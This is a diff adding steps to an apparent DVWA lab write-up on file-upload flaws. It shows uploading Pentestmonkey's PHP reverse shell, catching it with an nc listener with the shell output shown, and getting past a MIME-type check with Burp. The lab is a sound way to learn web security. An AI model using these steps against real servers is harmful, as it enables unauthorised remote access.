@@ -64,6 +64,44 @@ if( isset( $_POST[ 'Upload' ] ) ) {
 ?> 
 ```
 
+1. Let grab [Pentestmonkey's PHP reverse shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) and make the required changes:
+
+    ![](shell_script.png)
+
+2. Upload the file on the webserver:
+
+    ![](shell_upload.png)
+
+3. Set up a listener:
+
+    ```shell
+    shell
+    nc -lvnp 9999
+    listening on [any] 9999 ...
+    ```
+
+4. Visit the given path:
+
+    ```shell
+    curl http://127.0.0.1:42001/../../hackable/uploads/php-reverse-shell.php
+    ```
+
+5. Check listener:
+
+    ```shell
+    nc -lvnp 9999
+    listening on [any] 9999 ...
+    connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 39452
+    Linux CSpanias 5.15.133.1-microsoft-standard-WSL2 #1 SMP Thu Oct 5 21:02:42 UTC 2023 x86_64 GNU/Linux
+    08:37:32 up 59 min,  1 user,  load average: 0.00, 0.02, 0.04
+    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+    kali     pts/1    -                07:37   59:46   0.00s   ?    -bash
+    uid=149(_dvwa) gid=156(_dvwa) groups=156(_dvwa)
+    /bin/sh: 0: can't access tty; job control turned off
+    $
+    ```
+
+> If this was a remote webserver, and not hosted on our PC, we would gain access to the actual webserver where we could further enumerate the network, pivot, or perform privilege escalation.
 
 ## Security: Medium
 
@@ -105,6 +143,18 @@ if( isset( $_POST[ 'Upload' ] ) ) {
 
 ?> 
 ```
+
+1. When trying to upload the same script to the webserver we fail as it only accepts `JPEG` or `PNG` images: 
+
+    ![](medium_failed_upload.png)
+
+2. Intercept the traffic with Burp when uploading the file and change the [MIME type](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types/Common_types):
+
+    ![](mime-type_original.png)
+
+    ![](medium_burp_content-type.png)
+
+3. Since the file has been uploaded, we can follow the same procedure as above to catch the reverse shell.
 
 ## Security: High
 
